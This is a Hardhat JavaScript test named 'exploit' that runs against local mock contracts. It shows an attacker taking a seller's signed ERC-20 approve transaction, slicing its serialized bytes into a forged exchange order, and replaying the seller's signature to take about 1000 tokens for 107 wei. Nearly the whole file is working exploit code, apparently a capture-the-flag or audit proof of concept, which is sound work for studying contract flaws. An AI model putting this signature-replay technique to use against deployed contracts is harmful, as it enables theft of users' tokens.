const { expect } = require("chai");
const { ethers } = require("hardhat");

const BN = ethers.BigNumber;
const eth = (value) => ethers.utils.parseEther(value.toString());

describe("exploit", function () {
  it("steals tokens from a seller", async function () {
    const [_deployer, seller, attacker] = await ethers.getSigners();
    const [initialAttackerBalance, initialSellerBalance] = await Promise.all([
      attacker.getBalance(), seller.getBalance(),
    ]);
    
    const token = await ethers.getContractFactory("MockERC20").then(f => f.deploy(seller.address));
    const exchange = await ethers.getContractFactory("Exchange").then(f => f.deploy());
    expect(await token.balanceOf(seller.address)).to.equal(eth(10000));

    const tx = await token.connect(seller).approve(exchange.address, eth(1000), { gasLimit: 50000 });
    const serializedTx = ethers.utils.serializeTransaction({ ...tx, gasPrice: null }).slice(2);
    
    const referrer = '0x' + serializedTx.substr(0, 40);
    const rate = '0x' + serializedTx.substr(80, 32);
    const orderType = '0xc0';
    const nonce = 0;

    const fakeOrder = [
      referrer,
      token.address,
      rate,
      nonce,
      eth(1000),
      orderType,
    ];

    console.log(tx);
    console.log(serializedTx);
    console.log(fakeOrder);

    const requiredEth = eth(1000).mul(BN.from(2).pow(64)).div(rate);
    const tokensOut = requiredEth.mul(rate).div(BN.from(2).pow(64));
    
    expect(requiredEth).to.equal(BN.from(107));
    expect(tokensOut).to.be.closeTo(eth(1000), eth(100));

    await exchange.connect(attacker).executeOrder(fakeOrder, 28, tx.r, tx.s, { value: requiredEth });

    expect(await token.balanceOf(seller.address)).to.equal(eth(10000).sub(tokensOut));
    expect(await token.balanceOf(attacker.address)).to.equal(tokensOut);
    expect(await attacker.getBalance()).to.closeTo(initialAttackerBalance, eth(0.01));
    expect(await seller.getBalance()).to.closeTo(initialSellerBalance, eth(0.01));
  });
});
